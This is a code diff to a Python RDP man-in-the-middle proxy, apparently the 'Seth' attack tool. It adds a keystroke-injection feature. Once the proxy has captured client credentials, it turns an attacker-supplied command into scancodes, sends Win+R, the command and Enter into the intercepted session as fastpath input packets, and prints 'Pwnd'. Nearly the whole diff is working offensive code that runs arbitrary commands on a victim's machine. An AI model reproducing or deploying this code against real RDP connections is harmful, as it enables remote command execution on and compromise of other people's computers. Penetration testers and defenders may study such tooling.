@@ -4,7 +4,9 @@ import threading
 import select
 import re
 import os
+import time
 from binascii import hexlify, unhexlify
+from base64 import b64encode
 
 from seth.args import args
 from seth.parsing import *
@@ -20,6 +22,8 @@ class RDPProxy(threading.Thread):
         self.lsock = local_conn
         self.rsock = remote_socket
         self.vars = {}
+        self.injection_key_count = -100
+        self.keyinjection_started = False
 
         #  self.relay_proxy = None
         #  if args.relay: # TODO
@@ -167,6 +171,9 @@ class RDPProxy(threading.Thread):
             self.save_vars(parse_rdp(data, self.vars, From=From))
             data = tamper_data(data, self.vars, From=From)
             s_out.send(data)
+
+            if From == "Client" and "creds" in self.vars and args.inject:
+                self.send_keyinjection(s_out)
         return True
 
 
@@ -187,6 +194,19 @@ class RDPProxy(threading.Thread):
             print("TLS alert internal error received, make sure to use RC4-SHA")
         else:
             raise
+
+    def send_keyinjection(self, s_out):
+        attack = convert_str_to_scancodes(args.inject)
+        if self.injection_key_count == 0:
+            print('Injecting command...')
+            for key in attack:
+                # use fastpath
+                data = unhexlify(b"4404%02x%02x" % (key[1], key[0]))
+                dump_data(data, From="Client", Modified=True)
+                s_out.send(data)
+                time.sleep(key[2])
+            print("Pwnd")
+        self.injection_key_count += 1
 
 
 def read_data(sock):
@@ -245,6 +265,62 @@ def get_ssl_version(sock):
 
 def stop_attack():
     os._exit(0)
+
+
+def convert_str_to_scancodes(string):
+    uppercase_letters = "ABCDEFGHJIJKLMNOPQRSTUVWXYZ"
+    # Actually, the following depends on the keyboard layout
+    special_chars = {
+        ":": ".",
+        "{": "[",
+        "}": "]",
+        "!": "1",
+        "@": "2",
+        "#": "3",
+        "$": "4",
+        "%": "5",
+        "^": "6",
+        "&": "7",
+        "*": "8",
+        "(": "9",
+        ")": "0",
+        "<": ",",
+        ">": ".",
+        "\"": "'",
+        "|": "\\",
+        "?": "/",
+        "_": "-",
+        "+": "=",
+    }
+    UP = 1
+    DOWN = 0
+    MOD = 2
+    # For some reason, the meta (win) key needs an additional modifier (+2)
+    result = [[consts.REV_SCANCODE["LMeta"], DOWN + MOD, .2],
+              [consts.REV_SCANCODE["R"], DOWN, 0],
+              [consts.REV_SCANCODE["R"], UP, 0.2],
+              [consts.REV_SCANCODE["LMeta"], UP + MOD, .1],
+             ]
+    for c in string:
+        if c in uppercase_letters:
+            result.append([consts.REV_SCANCODE["LShift"], DOWN, 0.02])
+            result.append([consts.REV_SCANCODE[c], DOWN, 0])
+            result.append([consts.REV_SCANCODE[c], UP, 0])
+            result.append([consts.REV_SCANCODE["LShift"], UP, 0])
+        elif c in special_chars:
+            c = special_chars[c]
+            result.append([consts.REV_SCANCODE["LShift"], DOWN, 0.02])
+            result.append([consts.REV_SCANCODE[c], DOWN, 0])
+            result.append([consts.REV_SCANCODE[c], UP, 0])
+            result.append([consts.REV_SCANCODE["LShift"], UP, 0])
+        else:
+            c = c.upper()
+            result.append([consts.REV_SCANCODE[c], DOWN, 0])
+            result.append([consts.REV_SCANCODE[c], UP, 0])
+    result += [[consts.REV_SCANCODE["Enter"], DOWN, 0],
+               [consts.REV_SCANCODE["Enter"], UP, 0],
+              ]
+    return result
 
 
 def run():
